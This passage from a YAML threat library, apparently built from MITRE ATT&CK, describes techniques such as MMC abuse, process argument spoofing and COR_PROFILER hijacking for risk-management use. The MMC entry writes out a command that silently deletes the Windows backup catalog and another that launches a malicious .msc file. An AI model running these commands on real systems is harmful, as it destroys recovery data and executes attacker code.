      Password reuse may allow the abuse of local accounts across a set of machines
      on a network for the purposes of Privilege Escalation and Lateral Movement.

      https://attack.mitre.org/techniques/T1078/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1211
    ref_id: T1211
    name: Exploitation for Defense Evasion
    description: "Adversaries may exploit a system or application vulnerability to\
      \ bypass security features. Exploitation of a vulnerability occurs when an adversary\
      \ takes advantage of a programming error in a program, service, or within the\
      \ operating system software or kernel itself to execute adversary-controlled\
      \ code.\_Vulnerabilities may exist in defensive security software that can be\
      \ used to disable or circumvent them.\n\nAdversaries may have prior knowledge\
      \ through reconnaissance that security software exists within an environment\
      \ or they may perform checks during or shortly after the system is compromised\
      \ for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001).\
      \ The security software will likely be targeted directly for exploitation. There\
      \ are examples of antivirus software being targeted by persistent threat groups\
      \ to avoid detection.\n\nThere have also been examples of vulnerabilities in\
      \ public cloud infrastructure of SaaS applications that may bypass defense boundaries\
      \ (Citation: Salesforce zero-day in facebook phishing attack), evade security\
      \ logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden\
      \ infrastructure.(Citation: GhostToken GCP flaw)\nhttps://attack.mitre.org/techniques/T1211"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127
    ref_id: T1127
    name: Trusted Developer Utilities Proxy Execution
    description: 'Adversaries may take advantage of trusted developer utilities to
      proxy execution of malicious payloads. There are many utilities used for software
      development related tasks that can be used to execute code in various forms
      to assist in development, debugging, and reverse engineering.(Citation: engima0x3
      DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation:
      LOLBAS Tracker) These utilities may often be signed with legitimate certificates
      that allow them to execute on a system and proxy execution of malicious code
      through a trusted process that effectively bypasses application control solutions.

      https://attack.mitre.org/techniques/T1127'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1529
    ref_id: T1529
    name: System Shutdown/Reboot
    description: 'Adversaries may shutdown/reboot systems to interrupt access to,
      or aid in the destruction of, those systems. Operating systems may contain commands
      to initiate a shutdown/reboot of a machine or network device. In some cases,
      these commands may also be used to initiate a shutdown/reboot of a remote computer
      or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation:
      alert_TA18_106A)


      Shutting down or rebooting systems may disrupt access to computer resources
      for legitimate users while also impeding incident response/recovery.


      Adversaries may attempt to shutdown/reboot a system after impacting it in other
      ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002)
      or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to
      hasten the intended effects on system availability.(Citation: Talos Nyetya June
      2017)(Citation: Talos Olympic Destroyer 2018)

      https://attack.mitre.org/techniques/T1529'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.014
    ref_id: T1218.014
    name: MMC
    description: "Adversaries may abuse mmc.exe to proxy execution of malicious .msc\
      \ files. Microsoft Management Console (MMC) is a binary that may be signed by\
      \ Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation:\
      \ win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save\
      \ custom consoles that contain administrative tools created by Microsoft, called\
      \ snap-ins. These snap-ins may be used to manage Windows systems locally or\
      \ remotely. MMC can also be used to open Microsoft created .msc files to manage\
      \ system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc\
      \ C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console\
      \ msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc\
      \ gpedit.msc</code>, which will open the Group Policy Editor application window.\
      \ \n\nAdversaries may use MMC commands to perform malicious tasks. For example,\
      \ <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog\
      \ on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490))\
      \ without prompts to the user (Note: <code>wbadmin.msc</code> may only be present\
      \ by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation:\
      \ phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious\
      \ .msc files. For example, adversaries may first create a malicious registry\
      \ Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object\
      \ Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation:\
      \ win_clsid_key) Then, adversaries may create custom consoles with the \u201C\
      Link to Web Address\u201D snap-in that is linked to the malicious CLSID subkey.(Citation:\
      \ mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious\
      \ CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\\
      to\\test.msc</code>.(Citation: abusing_com_reg)\nhttps://attack.mitre.org/techniques/T1218/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.010
    ref_id: T1564.010
    name: Process Argument Spoofing
    description: 'Adversaries may attempt to hide process command-line arguments by
      overwriting process memory. Process command-line arguments are stored in the
      process environment block (PEB), a data structure used by Windows to store various
      information about/used by a process. The PEB includes the process command-line
      arguments that are referenced when executing the process. When a process is
      created, defensive tools/sensors that monitor process creations may retrieve
      the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation:
      Xpn Argue Like Cobalt 2019)


      Adversaries may manipulate a process PEB to evade defenses. For example, [Process
      Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn
      a process in a suspended state with benign arguments. After the process is spawned
      and the PEB is initialized (and process information is potentially logged by
      tools/sensors), adversaries may override the PEB to modify the command-line
      arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106)
      <code>WriteProcessMemory()</code> function) then resume process execution with
      malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue
      Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)


      Adversaries may also execute a process with malicious command-line arguments
      then patch the memory with benign arguments that may bypass subsequent process
      memory analysis.(Citation: FireEye FiveHands April 2021)


      This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004))
      to manipulate or further evade process-based detections.

      https://attack.mitre.org/techniques/T1564/010'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.012
    ref_id: T1574.012
    name: COR_PROFILER
    description: 'Adversaries may leverage the COR_PROFILER environment variable to
      hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER
      is a .NET Framework feature which allows developers to specify an unmanaged
      (or external of .NET) profiling DLL to be loaded into each .NET process that
      loads the Common Language Runtime (CLR). These profilers are designed to monitor,
      troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft
      Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)


      The COR_PROFILER environment variable can be set at various scopes (system,
      user, or process) resulting in different levels of influence. System and user-wide
      environment variable scopes are specified in the Registry, where a [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can
      be registered as a profiler DLL. A process scope COR_PROFILER can also be created
      in-memory without modifying the Registry. Starting with .NET Framework 4, the
      profiling DLL does not need to be registered as long as the location of the
      DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft
      COR_PROFILER Feb 2013)


      Adversaries may abuse COR_PROFILER to establish persistence that executes a
      malicious DLL in the context of all .NET processes every time the CLR is invoked.
      The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account
      Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET
      process executes at a higher permission level, as well as to hook and [Impair
      Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation:
      RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation:
      Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation:
      subTee .NET Profilers May 2017)

      https://attack.mitre.org/techniques/T1574/012'
